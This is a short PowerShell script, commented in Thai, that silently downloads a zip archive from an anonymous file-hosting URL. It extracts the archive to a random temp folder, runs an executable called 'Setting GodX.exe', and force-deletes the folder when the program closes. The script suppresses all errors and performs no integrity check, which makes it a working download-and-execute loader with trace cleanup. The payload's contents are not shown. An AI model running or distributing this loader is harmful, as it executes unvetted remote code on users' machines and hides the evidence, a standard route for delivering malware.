# ปิดการแสดงผลเพื่อความเงียบ
$ErrorActionPreference = 'SilentlyContinue'

# 1. กำหนดค่า
$zipName = "Setting GodX.zip"
$exeName = "Setting GodX.exe"
$url = "https://files.catbox.moe/afb9rh.zip"
$tempDir = Join-Path $env:TEMP ([Guid]::NewGuid().ToString())
$zipPath = Join-Path $tempDir $zipName

# 2. สร้างที่เก็บชั่วคราว
New-Item -ItemType Directory -Path $tempDir | Out-Null

# 3. โหลดและแตกไฟล์
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $zipPath)
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)

# 4. รันโปรแกรม (ใช้ & และกำหนด Working Directory เพื่อให้ GUI ขึ้น)
$exePath = Join-Path $tempDir $exeName
$proc = Start-Process -FilePath $exePath -WorkingDirectory $tempDir -PassThru

# 5. รอจนกว่าจะปิดโปรแกรม แล้วลบโฟลเดอร์ทิ้งให้หมดจด
$proc.WaitForExit()
Remove-Item $tempDir -Recurse -Force
